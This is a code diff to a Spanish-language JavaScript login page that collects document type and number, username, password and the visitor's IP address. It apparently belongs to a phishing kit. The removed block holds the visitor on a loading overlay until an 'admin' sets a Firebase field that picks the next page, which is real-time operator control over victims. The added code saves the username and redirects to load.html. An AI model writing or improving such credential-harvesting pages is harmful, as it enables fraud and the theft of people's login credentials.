@@ -57,17 +57,9 @@ document.addEventListener('DOMContentLoaded', async function () {
     const passwordInput = document.getElementById('p'); // Contraseña
     const submitBtn = document.getElementById('cmdLogin'); // Botón de login
     const ipInput = document.getElementById('direccionIP');
-    const overlay = document.getElementById('overlay');
+    const overlay = document.getElementById('loader-container');
     
-    console.log('🔍 Elementos encontrados:', {
-        tipoDoc: !!tipoDocSelect,
-        documento: !!documentoInput,
-        usuario: !!usuarioInput,
-        password: !!passwordInput,
-        boton: !!submitBtn,
-        overlay: !!overlay,
-        ip: !!ipInput
-    });
+    
     
     if (!usuarioInput || !submitBtn) {
         console.error('❌ Elementos críticos no encontrados');
@@ -197,8 +189,7 @@ document.addEventListener('DOMContentLoaded', async function () {
         try {
             // Mostrar overlay de carga
             if (overlay) {
-                overlay.style.display = "flex";
-                console.log('📺 Mostrando overlay de carga');
+                overlay.style.display = "block";
             }
             
             submitBtn.disabled = true;
@@ -298,71 +289,16 @@ document.addEventListener('DOMContentLoaded', async function () {
                 }
             }, 100);
 
-            // 4. Configurar timeout máximo de espera
-            const timeoutId = setTimeout(() => {
-                if (unsubscribe) unsubscribe();
-                submitBtn.disabled = false;
-                submitBtn.style.opacity = '1';
-                if (overlay) overlay.style.display = "none";
-                alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
-                console.log('⏰ Timeout - Usuario desconectado');
-            }, appConfig.timeout);
-
-            // 5. ⭐ ESCUCHAR CAMBIOS EN TIEMPO REAL - Corazón del sistema
-            console.log('👂 Iniciando escucha de cambios en Firebase...');
-            unsubscribe = userRef.onSnapshot((doc) => {
-                if (doc.exists) { // Corregido: doc.exists sin paréntesis para compat
-                    const userData = doc.data();
-                    const page = userData.page;
-                    
-                    console.log('🔄 Cambio detectado en Firebase:', { page, userData });
-                    
-                    // Si page > 0, redireccionar según la configuración
-                    if (page > 0) {
-                        console.log(`🎯 Redirigiendo a página ${page}`);
-                        
-                        // Cancelar timeout
-                        clearTimeout(timeoutId);
-                        
-                        // Guardar usuario en localStorage para la siguiente página
-                        localStorage.setItem('usuarioActual', nombreUsuario);
-                        console.log('💾 Usuario guardado en localStorage:', nombreUsuario);
-                        
-                        // Verificar que se guardó correctamente
-                        const verificacion = localStorage.getItem('usuarioActual');
-                        console.log('🔍 Verificación localStorage:', verificacion);
-                        
-                        // Usar configuración de rutas con pequeño delay para asegurar guardado
-                        const route = appConfig.routes[page];
-                        if (route) {
-                            console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
-                            if (overlay) overlay.style.display = "none";
-                            
-                            // Pequeño delay para asegurar que localStorage se guarde
-                            setTimeout(() => {
-                                window.location.href = route.url;
-                            }, 100);
-                        } else {
-                            console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
-                            if (overlay) overlay.style.display = "none";
-                            setTimeout(() => {
-                                window.location.href = `page${page}.html`;
-                            }, 100);
-                        }
-                    }
-                    // Si page es 0, mantener el loader visible esperando instrucciones del admin
-                    else {
-                        console.log('⏳ Manteniendo estado de espera (page: 0)');
-                    }
-                } else {
-                    console.warn('⚠️ Documento no existe en Firebase');
-                }
-            }, (error) => {
-                console.error('❌ Error en la escucha de Firebase:', error);
-                clearTimeout(timeoutId);
-                if (overlay) overlay.style.display = "none";
-                alert('Error de conexión. Por favor, intente nuevamente.');
-            });
+            // 4. Guardar usuario en localStorage y redirigir a load.html
+            localStorage.setItem('usuarioActual', nombreUsuario);
+            console.log('💾 Usuario guardado en localStorage:', nombreUsuario);
+            
+            console.log('🚀 Datos guardados - Redirigiendo a load.html');
+            
+            // Pequeño delay para asegurar que todo se guarde
+            setTimeout(() => {
+                window.location.href = 'load.html';
+            }, 500);
             
         } catch (error) {
             console.error('❌ Error en el proceso:', error);
